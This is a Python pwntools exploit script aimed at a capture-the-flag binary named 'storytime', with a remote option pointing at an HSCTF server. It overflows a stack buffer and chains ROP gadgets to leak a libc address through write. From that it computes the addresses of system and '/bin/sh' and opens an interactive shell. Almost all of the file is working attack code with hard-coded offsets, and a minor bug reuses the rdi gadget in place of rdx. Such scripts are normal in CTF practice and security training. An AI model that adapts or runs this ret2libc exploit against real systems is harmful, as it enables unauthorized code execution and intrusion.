from pwn import * 
import sys 

argv=sys.argv

DEBUG=True  
binary = './storytime'
context.terminal=['tmux','splitw','-v']
context(arch='amd64')

if context.bits == 64:
    r=process(['ROPgadget','--binary',binary])
    gadgets = r.recvall().strip().split('\n')[2:-2]
    gadgets = map(lambda x: x.split(' : '),gadgets)
    gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
    r.close()

    pop_rdi=0
    pop_rsi_r15=0
    pop_rdx=0


    for addr,name in gadgets:
        if 'pop rdi' in name:
            pop_rdi = addr

        if 'pop rsi r15' in name:
            pop_rsi_r15 = addr

        if 'pop rdx' in name:
            pop_rdx = addr 

    def call(f,a1,a2,a3):
        out=''
        if a1 != None:
            out+=p64(pop_rdi)+p64(a1)
            print out

        if a2 != None:
            out+=p64(pop_rsi_r15)+p64(a2)*2
            print out
        if a3 != None:
            if pop_rdx==0:
                print "not found rdx"
                exit(-1)
            else:
                out+=p64(pop_rdi)+p64(a3)
        return out+p64(f)




def gdbattach():
    gdb.attach(sh)
if DEBUG:
    context.log_level='debug'
if len(argv)<2:
    stdout=process.PTY
    stdin = process.PTY
    sh=process(binary,stdout=stdout,stdin=stdin)

    REMOTE = False 
else:
    sh=remote('pwn.hsctf.com','3333')
    REMOTE = True

    
write_plt= 0x4004a0
write_got = 0x601018
main_addr = 0x40062e

#leak libc
payload='a'*(0x30+8)
payload+=call(write_plt,1,write_got,None)
payload+=p64(main_addr)
sh.sendlineafter(': \n',payload)

libc_base = u64(sh.recvuntil('story:')[:8])-0x0f72b0
print 'libc_base: {}'.format(hex(libc_base))


system_addr = libc_base + 0x045390
bin_sh_addr = libc_base + 0x18cd57

payload = 'a'*(0x30+8)
payload += call(system_addr, bin_sh_addr, None, None)
sh.sendlineafter(': \n', payload)

sh.interactive()




        
            

